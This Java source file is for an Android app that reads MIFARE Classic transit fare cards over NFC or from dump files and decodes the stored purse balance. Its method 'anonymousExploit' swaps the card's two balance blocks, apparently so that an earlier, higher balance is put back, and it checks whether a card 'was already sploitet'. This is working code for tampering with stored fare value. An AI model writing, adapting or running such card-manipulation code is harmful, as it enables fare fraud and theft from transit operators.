package com.vsttrfk.git64;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;

import android.nfc.TagLostException;
import android.nfc.tech.MifareClassic;
import android.util.Log;

public class VsttrfkCard {

	private static enum BlockId {
		PURSE((byte) 0x85),
		LOG((byte) 0xA3);

		private byte id;

		private BlockId(byte id) {
			this.id = id;
		}
	};

	private final byte[][] data = new byte[64][16]; // 16 sectors each with four
													// lines, 16 bytes per line

	/**
	 * Create card object from nfc-source
	 * 
	 * @param mfc
	 */
	public VsttrfkCard(MifareClassic mfc) throws TagLostException, IOException {
		if (!mfc.isConnected()) {
			try{
				mfc.connect();
			} catch(IllegalStateException e){
				throw new TagLostException("card was removed");
			}
		}
		IVsttrfkAuthable readAuth = new ReadAuth(mfc);
		for (int i = 0; i < data.length; i++) {

			// every 4th block is a new sector... try to auth..
			if (i % 4 == 0 && !readAuth.authToSector(i / 4)) {
				throw new IOException("Unable to auth to sector :" + i / 4
						+ ".");
			}

			data[i] = mfc.readBlock(i);
		}

	}

	/**
	 * Create card object a saved dump
	 * 
	 * @param path
	 * @throws IOException 
	 * @throws FileNotFoundException 
	 */
	public VsttrfkCard(String path) throws FileNotFoundException, IOException{
		final File binDump = new File(path);
		if(!binDump.exists()){
			Log.e("IO Error", "File: "+ binDump.getAbsolutePath() + " does not exsist!!");
		}
		final byte[] bytes = Util.getBytesFromFile(binDump);
		// split into blocks. it actually makes sense
		for (int i = 0; i < MifareClassic.SIZE_1K; i++) {
			data[i / data[0].length][i % data[0].length] = bytes[i];
		}
	}

	public byte[][] getData() {
		return data;
	}

	public byte[] getId(){
		byte[] result = new byte[4];
		
		for(int i = 0; i < 4; i++){
			result[i] = data[0][i];
		}
		return result;
	}

	public boolean anonymousExploit() {
		final int i = getBlock(BlockId.PURSE);
		if (Util.toHexString(data[8][3]).charAt(1) == '8'
				&& data[i + 1][0] > data[i + 2][0]) {
			return false; // Card was already sploitet.
		}

		// switch places between the two balance blocks.
		final byte[] temp = data[i + 1];
		data[i + 1] = data[i + 2];
		data[i + 2] = temp;

		return true;
	}

	private int getBlock(BlockId idEnum) {
		final byte purseId = idEnum.id;
		int i = 0;
		while (data[i][0] != purseId && i < data.length) {
			i++;
		}
		return i;
	}

	private int getBalanceBlock(){
		final int i = getBlock(BlockId.PURSE);
		final String blockSelect = Util.toHexString(data[8][3]);
		int result = 0 ;
		if (blockSelect.charAt(1) == '8') {
			result = i + 2;
		}
		if (blockSelect.charAt(1) == '4') {
			result = i + 1;
		}

		return result;
	}
	private double getBalanceFromBlock(byte[] balanceBlock){
		final String balancePosNeg = Util.toHexString(balanceBlock[6]);
		int value = 0;
		value = Util.byteToInt(new byte[] { balanceBlock[5], balanceBlock[4] }, 0);
		if (balancePosNeg.charAt(0) == '7') {
			value -= 0xFFFF; 
		}
		return value / 25.0;
	}
	
	public double getOldBalance() {
		int bBlock = getBalanceBlock();
		int purseStart = getBlock(BlockId.PURSE);
		return getBalanceFromBlock(data[purseStart+1+(bBlock-purseStart)%2]);	
	}
	
	public double getBalance() {
		return getBalanceFromBlock(data[getBalanceBlock()]);
	}
}
